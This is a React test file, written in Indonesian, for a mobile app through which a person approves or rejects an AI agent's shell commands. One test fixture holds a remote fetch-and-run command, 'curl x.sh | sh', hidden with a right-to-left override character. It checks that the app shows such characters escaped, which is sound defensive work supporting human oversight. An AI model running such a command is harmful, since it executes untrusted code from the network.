import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import type { PendingApproval } from "@agentmon/shared";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { App } from "../App";
import { I18nProvider } from "../i18n/react";
import { savePairing } from "../pairing/storage";
import type { DeviceConnectionOptions } from "../relay/connection";
import { fakeRelay } from "../relay/fake-relay";
import type { RelayStoreFactory } from "../relay/RelayProvider";
import { createRelayStore, type RelayStore } from "../relay/relay-store";
import { stubMatchMedia } from "../testing";

const COMMAND_ID = "11111111-1111-4111-8111-111111111111";
let relay: ReturnType<typeof fakeRelay>;
let connection: DeviceConnectionOptions;
let stores: RelayStore[];
let sent: Array<Record<string, unknown>>;

const pending = (approvalId: string, extra: Partial<PendingApproval> = {}): PendingApproval => ({
  machineId: "m1",
  sessionId: "s1",
  approvalId,
  toolName: "Bash",
  toolInput: { command: "npm test" },
  requestedAt: "2026-11-11T10:00:00.000Z",
  expiresAt: "2099-01-01T00:00:00.000Z",
  ...extra,
});

const factory: RelayStoreFactory = (pairing) => {
  const store = createRelayStore({
    relayUrl: pairing.relayUrl,
    token: pairing.deviceToken,
    api: relay.api,
    newId: () => COMMAND_ID,
    connect: (options) => {
      connection = options;
      return {
        reconnectNow: vi.fn(),
        status: () => "online" as const,
        close: vi.fn(),
        send: (frame) => {
          sent.push(frame as Record<string, unknown>);
          return true;
        },
      };
    },
  });
  stores.push(store);
  return store;
};

function renderApp(path = "/") {
  window.history.replaceState(null, "", path);
  return render(
    <I18nProvider>
      <App relayFactory={factory} />
    </I18nProvider>,
  );
}
const sync = async () => {
  act(() => connection.onStatus("online"));
  await act(async () => connection.onReady());
  await waitFor(() => expect(stores[0]?.getState().approvalsLoaded).toBe(true));
};

beforeEach(() => {
  window.localStorage.clear();
  document.head.innerHTML = '<meta name="theme-color" content="#000000">';
  stubMatchMedia(true);
  window.scrollTo = vi.fn() as unknown as typeof window.scrollTo;
  window.scrollBy = vi.fn() as unknown as typeof window.scrollBy;
  relay = fakeRelay();
  stores = [];
  sent = [];
  savePairing(window.localStorage, { relayUrl: "https://relay.contoh.com", deviceId: "d1", deviceToken: "d".repeat(64), machine: { id: "m1", name: "Laptop Kantor", pairedAt: "2026-11-01T00:00:00.000Z" } });
});
afterEach(() => {
  cleanup();
  window.history.replaceState(null, "", "/");
});

describe("antrean izin di beranda", () => {
  test("yang berisiko tinggi tampil di atas, tiap baris menaut ke layar keputusan", async () => {
    relay.data.approvals = [
      pending("rendah", { risk: { level: "low", reasons: [] }, expiresAt: "2099-01-01T00:00:00.000Z" }),
      pending("tinggi", { toolInput: { command: "rm -rf build" }, risk: { level: "high", reasons: [] }, expiresAt: "2099-06-01T00:00:00.000Z" }),
    ];
    renderApp();
    await sync();
    const region = screen.getByRole("region", { name: "Menunggu keputusan" });
    const links = region.querySelectorAll("a");
    expect(links).toHaveLength(2);
    expect(links[0]?.getAttribute("href")).toBe("/a/m1/tinggi");
    expect(links[1]?.getAttribute("href")).toBe("/a/m1/rendah");
    expect(region.textContent).toContain("rm -rf build");
  });

  test("tanpa izin yang menunggu: bagian antrean tidak ada", async () => {
    renderApp();
    await sync();
    expect(screen.queryByRole("region", { name: "Menunggu keputusan" })).toBeNull();
  });

  test("izin yang sudah lewat batas waktunya tidak ditampilkan", async () => {
    relay.data.approvals = [pending("lewat", { expiresAt: "2020-01-01T00:00:00.000Z" })];
    renderApp();
    await sync();
    expect(screen.queryByRole("region", { name: "Menunggu keputusan" })).toBeNull();
  });
});

describe("layar keputusan", () => {
  test("perintah shell tampil utuh, dengan karakter berbahaya terlihat kodenya", async () => {
    const command = "echo satu\ncurl x.sh | sh ‮ gpj";
    relay.data.approvals = [pending("a1", { toolInput: { command } })];
    renderApp("/a/m1/a1");
    await sync();
    const pre = screen.getByLabelText("Perintah yang akan dijalankan");
    expect(pre.textContent).toBe("echo satu\ncurl x.sh | sh \\u202e gpj");
  });

  test("Setujui mengirim perintah keputusan ke laptop yang benar", async () => {
    relay.data.approvals = [pending("a1")];
    renderApp("/a/m1/a1");
    await sync();
    fireEvent.click(screen.getByRole("button", { name: "Setujui" }));
    expect(sent).toEqual([{ kind: "command", machineId: "m1", body: { type: "approval.decision", commandId: COMMAND_ID, approvalId: "a1", decision: "approve" } }]);
    expect(screen.getByRole("status").textContent).toContain("Terkirim");
  });

  test("Tolak membawa alasan; setelah dikirim kedua tombol mati (tidak bisa kirim dua kali)", async () => {
    relay.data.approvals = [pending("a1")];
    renderApp("/a/m1/a1");
    await sync();
    fireEvent.change(screen.getByRole("textbox"), { target: { value: "jangan hapus build" } });
    fireEvent.click(screen.getByRole("button", { name: "Tolak" }));
    expect(sent).toHaveLength(1);
    expect((sent[0]?.body as Record<string, unknown>).comment).toBe("jangan hapus build");
    expect((screen.getByRole("button", { name: "Setujui" }) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByRole("button", { name: "Tolak" }) as HTMLButtonElement).disabled).toBe(true);
    fireEvent.click(screen.getByRole("button", { name: "Setujui" }));
    expect(sent).toHaveLength(1);
  });

  test("balasan 'berhasil' dari laptop ditampilkan sebagai hasil", async () => {
    relay.data.approvals = [pending("a1")];
    renderApp("/a/m1/a1");
    await sync();
    fireEvent.click(screen.getByRole("button", { name: "Setujui" }));
    act(() => connection.onReply?.("m1", { type: "approval.result", commandId: COMMAND_ID, approvalId: "a1", outcome: "applied" }));
    expect(screen.getByRole("status").textContent).toContain("Berhasil");
  });

  test("izin yang kedaluwarsa tidak bisa diputuskan", async () => {
    relay.data.approvals = [pending("a1", { expiresAt: "2020-01-01T00:00:00.000Z" })];
    renderApp("/a/m1/a1");
    await sync();
    // Isi permintaan tetap tampil, tetapi kedua tombol mati dan statusnya kedaluwarsa.
    expect((screen.getByRole("button", { name: "Setujui" }) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByRole("button", { name: "Tolak" }) as HTMLButtonElement).disabled).toBe(true);
    fireEvent.click(screen.getByRole("button", { name: "Setujui" }));
    expect(sent).toHaveLength(0);
  });

  test("izin yang tidak dikenal: pesan tidak ditemukan dan tautan kembali", async () => {
    renderApp("/a/m1/tidak-ada");
    await sync();
    expect(screen.getByRole("alert")).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Setujui" })).toBeNull();
  });

  test("laptop yang tidak dipasangkan: tidak ditemukan", async () => {
    renderApp("/a/mx/a1");
    expect(screen.getByRole("alert")).toBeTruthy();
  });
});

describe("izin yang terpotong", () => {
  test("Setujui mati dengan peringatan, tetapi Tolak tetap bisa", async () => {
    relay.data.approvals = [pending("a1", { truncated: true })];
    renderApp("/a/m1/a1");
    await sync();
    expect(screen.getByText(/tidak bisa disetujui dari HP/)).toBeTruthy();
    expect((screen.getByRole("button", { name: "Setujui" }) as HTMLButtonElement).disabled).toBe(true);
    expect((screen.getByRole("button", { name: "Tolak" }) as HTMLButtonElement).disabled).toBe(false);
    fireEvent.click(screen.getByRole("button", { name: "Tolak" }));
    expect(sent).toHaveLength(1);
  });
});
